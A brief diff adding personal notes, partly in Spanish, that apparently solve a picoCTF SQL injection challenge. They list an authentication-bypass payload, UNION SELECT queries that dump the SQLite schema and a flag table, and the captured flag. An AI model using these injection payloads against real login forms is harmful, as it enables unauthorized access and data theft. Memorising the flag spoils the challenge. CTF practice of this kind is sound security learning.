@@ -1,0 +1,10 @@
+Loguearme en http://saturn.picoctf.net:54301
+
+username: admin
+password: ' OR 1=1--
+
+' UNION SELECT tbl_name, sql, 3 FROM sqlite_master--
+
+' UNION SELECT 1, flag, 3 FROM more_table--
+
+picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}
